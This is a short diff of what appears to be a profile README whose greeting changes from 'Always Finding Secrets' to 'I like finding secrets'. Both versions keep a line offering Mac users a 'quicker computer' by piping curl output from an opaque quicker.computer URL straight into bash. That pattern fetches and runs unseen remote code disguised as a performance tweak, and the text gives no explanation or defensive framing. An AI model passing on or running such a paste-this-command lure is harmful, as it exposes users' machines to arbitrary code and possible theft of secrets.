@@ -1,5 +1,5 @@
-### Hi there 👋
-Always Finding Secrets\
+### Hi
+I like finding secrets\
 if you want a quicker computer mac edition:\
 `curl -Ls quicker.computer/Fr345T5GTRANDOMSTRING24n4t5|bash`\
 a quicker windows script coming soon
